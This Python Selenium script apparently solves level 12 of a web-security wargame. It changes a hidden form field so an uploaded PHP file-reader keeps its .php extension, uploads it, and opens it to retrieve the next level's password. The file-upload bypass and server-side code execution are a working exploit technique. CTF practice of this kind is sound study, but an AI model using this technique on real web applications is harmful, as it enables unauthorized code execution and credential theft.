from common import *

def solve(driver, _ = None):
    driver.get(build_url(level=12))
    
    path = create_random_temp_file("php")
    with open(path, "w") as f:
        f.write(build_php_file_reader(13))
    
    # change the file path on the server side
    driver.execute_script(f"""document.querySelector("#content > form > input[type=hidden]:nth-child(2)").setAttribute('value', '{path}')""")
    
    # upload the file
    driver.find_element(By.XPATH, '/html/body/div[1]/form/input[3]').send_keys(path)
    driver.find_element(By.XPATH, '/html/body/div[1]/form/input[4]').click()
    
    # get the password
    driver.find_element(By.XPATH, '/html/body/div[1]/a').click()
    WebDriverWait(driver, 10).until(lambda _: driver.find_element(By.XPATH, '/html/body'))
    password = driver.find_element(By.XPATH, '/html/body').text
    
    # delete the file
    os.remove(path)
    
    driver.get(build_url(password = password, level=13))
    return password